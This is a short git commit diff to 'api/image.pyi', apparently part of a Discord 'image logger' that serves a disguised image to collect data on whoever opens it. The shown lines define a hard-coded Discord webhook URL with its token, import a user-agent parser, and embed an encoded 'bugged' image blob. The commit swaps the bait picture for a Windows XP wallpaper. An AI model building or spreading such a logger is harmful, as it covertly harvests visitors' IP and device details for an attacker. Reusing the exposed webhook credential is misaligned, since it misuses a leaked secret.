8badf8613a18d37e2f4b9ddfc867b84248579793
marleyspamsl2-collab <marleyspamsl2@gmail.com>
2025-12-04 15:34:18 +0000

    Update image.pyi

--- api/image.pyi
+++ api/image.pyi
@@ -5,7 +5,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1446159196117794860/KUYLijMktEgz6hspW_Bu_F86QhA5cvNGZpGHYuKCBzaj3CA-nxbdavN5aOtTr9608zcX'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = httpx.get('https://moewalls.com/wp-content/uploads/2023/04/bliss-windows-xp-thumb.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
